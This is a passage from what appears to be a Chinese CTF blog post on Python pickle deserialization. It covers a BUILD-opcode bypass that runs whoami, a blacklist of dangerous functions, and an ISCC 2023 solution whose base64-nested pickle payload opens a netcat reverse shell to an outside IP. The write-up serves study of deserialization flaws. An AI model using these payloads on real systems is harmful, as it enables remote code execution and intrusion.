+<h3 id="BUILD指令绕过"><a href="#BUILD指令绕过" class="headerlink" title="BUILD指令绕过"></a>BUILD指令绕过</h3><p>reduce方法是可以执行rce的，那么如果题目中禁用掉了reduce,可以通过{‘setstate‘: os.system}来BUILD这个对象<br><code>b&#39;\x80\x03c__main__\ntest\nq\x00)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.&#39;</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> 0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;__main__ test&#x27;   </span><br><span class="line">   17: q    BINPUT     0</span><br><span class="line">   19: )    EMPTY_TUPLE</span><br><span class="line">   20: \x81 NEWOBJ</span><br><span class="line">   21: &#125;    EMPTY_DICT</span><br><span class="line">   22: (    MARK</span><br><span class="line">   23: V        UNICODE    &#x27;__setstate__&#x27;</span><br><span class="line">   37: c        GLOBAL     &#x27;os system&#x27;   //即使代码中没有import os，GLOBAL指令也可以自动导入os.system。</span><br><span class="line">   48: u        SETITEMS   (MARK at 22)  </span><br><span class="line">   49: b    BUILD</span><br><span class="line">   50: V    UNICODE    &#x27;whoami&#x27;</span><br><span class="line">   58: b    BUILD</span><br><span class="line">   59: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<h3 id="绕过函数黑名单"><a href="#绕过函数黑名单" class="headerlink" title="绕过函数黑名单"></a>绕过函数黑名单</h3><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]</span><br></pre></td></tr></table></figure>
+<h4 id="iscc2023-ISCC内部零元购-2"><a href="#iscc2023-ISCC内部零元购-2" class="headerlink" title="iscc2023 ISCC内部零元购-2"></a>iscc2023 ISCC内部零元购-2</h4><p>经检测发现只是简单的黑名单匹配检测，使用base64编码绕过黑名单，再用pickle.load执行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dairy</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc 124.220.165.133 2333 -e/bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">user = dairy()</span><br><span class="line">y = pickle.dumps(user,protocol=<span class="number">3</span>)</span><br><span class="line">y=pickletools.optimize(y)</span><br><span class="line"></span><br><span class="line">y=base64.b64encode(y)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(y)).encode())</span><br><span class="line"></span><br><span class="line">yy=<span class="string">b&#x27;\x80\x03c_pickle\nloads\ncbase64\nb64decode\nX&#x27;</span>+<span class="string">b&#x27;\x74&#x27;</span> +<span class="string">b&#x27;\x00\x00\x00&#x27;</span>+y+<span class="string">b&#x27;\x85R\x85R.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(yy)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;0x74&#x27;</span><br><span class="line">b&#x27;\x80\x03c_pickle\nloads\ncbase64\nb64decode\nXt\x00\x00\x00gANjYnVpbHRpbnMKZXZhbApYPAAAAF9faW1wb3J0X18oJ29zJykuc3lzdGVtKCduYyAxMjQuMjIwLjE2NS4xMzMgMjMzMyAtZS9iaW4vc2gnKYVSLg==\x85R\x85R.&#x27;     </span><br><span class="line">    0: \x80 PROTO      3</span><br><span class="line">    2: c    GLOBAL     &#x27;_pickle loads&#x27;</span><br><span class="line">   17: c    GLOBAL     &#x27;base64 b64decode&#x27;</span><br><span class="line">   35: X    BINUNICODE &#x27;gANjYnVpbHRpbnMKZXZhbApYPAAAAF9faW1wb3J0X18oJ29zJykuc3lzdGVtKCduYyAxMjQuMjIwLjE2NS4xMzMgMjMzMyAtZS9iaW4vc2gnKYVSLg==&#x27;</span><br><span class="line">  156: \x85 TUPLE1</span><br><span class="line">  157: R    REDUCE</span><br><span class="line">  158: \x85 TUPLE1</span><br><span class="line">  159: R    REDUCE</span><br><span class="line">  160: .    STOP</span><br><span class="line">highest protocol among opcodes = 2</span><br></pre></td></tr></table></figure>
+<p>这里的想法是直接嵌套,没想到就成了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\x80\x03c_pickle\nloads</span><br><span class="line">\ncbase64\nb64decode</span><br><span class="line">\nX\x20\x00\x00\x00gANjbnQKc3lzdGVtClgDAAAAZGlyhVIu</span><br><span class="line">\x85R</span><br><span class="line">\x85R</span><br><span class="line">.</span><br></pre></td></tr></table></figure>
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/python/" rel="tag"># python</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/04/23/js/nodejs/" rel="prev" title="js学习之路">
+                  <i class="fa fa-chevron-left"></i> js学习之路
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/28/c#/c#wcf/" rel="next" title="c# wcf">
+                  c# wcf <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">mayylu</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdn.jsdelivr.net/npm/ribbon.js@1.0.2/dist/ribbon.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
